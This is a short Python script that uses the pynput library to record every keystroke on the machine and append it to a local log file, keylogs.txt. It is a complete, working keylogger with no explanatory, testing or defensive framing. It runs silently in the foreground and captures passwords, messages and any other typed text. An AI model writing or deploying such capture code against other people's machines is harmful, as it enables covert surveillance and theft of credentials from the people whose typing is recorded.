from pynput.keyboard import Listener

# File to store the logs
log_file = "keylogs.txt"

def on_press(key):
    # Log the key pressed
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            # Handle special keys (e.g., ENTER, SPACE, etc.)
            if key == key.space:
                f.write(" ")
            elif key == key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# Start listening to keyboard events
with Listener(on_press=on_press) as listener:
    listener.join()
